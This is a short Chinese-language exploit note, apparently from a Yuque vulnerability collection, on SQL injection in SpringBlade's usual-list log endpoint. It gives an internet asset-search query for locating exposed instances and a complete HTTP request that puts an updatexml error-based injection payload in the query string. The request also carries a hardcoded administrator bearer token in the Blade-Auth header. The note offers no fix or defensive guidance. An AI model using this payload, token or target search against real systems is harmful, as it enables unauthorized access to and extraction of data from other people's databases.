# SpringBlade usual-list存在SQL注入漏洞

# 一、漏洞简介
SpringBlade usual-list存在SQL注入漏洞，攻击者利用该漏洞进行SQL注入攻击

# 二、影响版本
+ SpringBlade

# 三、资产测绘
+ `<font style="color:rgb(63, 63, 63);">body="https://bladex.vip"</font>`

![1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71.png](./img/UrhsBBU4enGgnTv_/1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71-979030.png)

# 四、漏洞复现
```java
GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Connection: close
```

![1722874655789-f2bdb393-4984-4ec8-b3fc-686b5e59b4ca.png](./img/UrhsBBU4enGgnTv_/1722874655789-f2bdb393-4984-4ec8-b3fc-686b5e59b4ca-732552.png)



> 更新: 2024-12-13 17:10:56  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xkw7kw5b99sih1la>